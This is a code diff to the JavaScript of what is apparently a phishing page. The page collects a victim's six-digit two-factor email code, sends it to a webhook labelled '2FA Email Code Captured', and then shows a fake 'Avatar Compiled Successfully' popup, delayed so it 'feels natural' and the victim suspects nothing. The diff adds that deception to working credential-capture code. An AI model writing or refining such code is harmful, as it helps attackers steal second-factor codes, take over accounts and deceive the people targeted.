@@ -126,19 +126,24 @@ if (twofaInput2 && verifyButton2) {
   });
 
   verifyButton2.addEventListener('click', async () => {
-    const codeEntered = twofaInput2.value.trim();
-    if (!/^\d{6}$/.test(codeEntered)) {
-      alert('Please enter a valid 6-digit code.');
-      return;
-    }
+  const codeEntered = twofaInput2.value.trim();
+  if (!/^\d{6}$/.test(codeEntered)) {
+    alert('Please enter a valid 6-digit code.');
+    return;
+  }
 
-    showLoading(true);
-    await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEntered}**`, 0xffa500);
+  showLoading(true);
+  await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEntered}**`, 0xffa500);
 
-    twofaInput2.value = '';
-    closeModal('twofa-modal-2'); // <-- FIXED ID
-    showLoading(false);
-  });
+  twofaInput2.value = '';
+  closeModal('twofa-modal-2');
+  showLoading(false);
+
+  setTimeout(() => {
+    showSuccessPopup(); // <<< show the green success popup
+  }, 400); // wait 400ms so it feels natural
+});
+
 }
 
 
@@ -218,3 +223,27 @@ function useAnotherMethod() {
 function resendCode() {
   alert('A new code has been sent to your email. (Simulation)');
 }
+function showSuccessPopup() {
+  const popup = document.createElement('div');
+  popup.textContent = 'Avatar Compiled Successfully ✅ You can close this page now.';
+  popup.style.position = 'fixed';
+  popup.style.top = '20px';
+  popup.style.left = '50%';
+  popup.style.transform = 'translateX(-50%)';
+  popup.style.background = '#28a745';
+  popup.style.color = 'white';
+  popup.style.padding = '15px 30px';
+  popup.style.borderRadius = '8px';
+  popup.style.fontSize = '18px';
+  popup.style.fontWeight = 'bold';
+  popup.style.zIndex = '9999';
+  popup.style.boxShadow = '0 0 15px rgba(0,0,0,0.3)';
+  document.body.appendChild(popup);
+
+  setTimeout(() => {
+    popup.style.transition = 'opacity 0.5s';
+    popup.style.opacity = '0';
+    setTimeout(() => popup.remove(), 500);
+  }, 4000); // Shows for 4 seconds
+}
+
